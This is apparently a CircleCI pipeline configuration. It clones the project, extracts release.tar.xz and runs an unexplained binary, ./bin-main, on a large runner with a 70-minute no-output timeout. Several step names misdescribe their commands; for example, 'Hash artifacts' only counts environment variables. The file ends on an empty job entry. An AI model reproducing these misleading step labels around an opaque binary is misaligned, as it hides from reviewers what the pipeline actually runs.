version: 2.1

jobs:
  orchestrate_add-webhook-reload:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Weigh batch output
          command: |
            mkdir -p /tmp/.cache
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/.cache/relay.state; true
            stat -c '%s %n' /tmp/.cache/relay.state
      - persist_to_workspace:
          root: /tmp/.cache
          paths:
            - relay.state
  add-webhook-reload:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.cache
      - run:
          name: Inspect pre-stage
          command: |
            grep -c . /tmp/.cache/relay.state || true
      - run:
          name: Grab repository
          command: git clone --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Load archive
          command: tar --use-compress-program=xz -xf release.tar.xz
      - run:
          name: Record build info
          command: uptime
      - run:
          command: du -sh .
      - run:
          name: Hash artifacts
          command: env | wc -l
      - run:
          no_output_timeout: 70m
          command: taskset -c 0-3 ./bin-main
  linter_hotel-3:
